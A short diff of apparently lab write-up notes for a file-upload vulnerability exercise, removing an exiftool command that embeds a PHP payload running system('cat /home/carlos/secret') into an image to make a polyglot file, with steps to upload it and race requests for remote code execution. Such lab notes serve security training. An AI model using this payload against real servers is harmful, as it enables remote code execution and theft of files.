@@ -141,9 +141,6 @@ You can log in to your own account using the following credentials: wiener:peter
 3. Sniper mode, null payload, continue indefinitely
 4. Run both request (POST/GET) in the same time and look the GET request
 
-```bash
-exiftool -Comment="<?php echo 'start ' .  system('cat /home/carlos/secret') . ' END'; ?>" dices.png -o polyglot4.php
-```
 
 3. Upload polyglot4.php
 4. Enjoy RCE
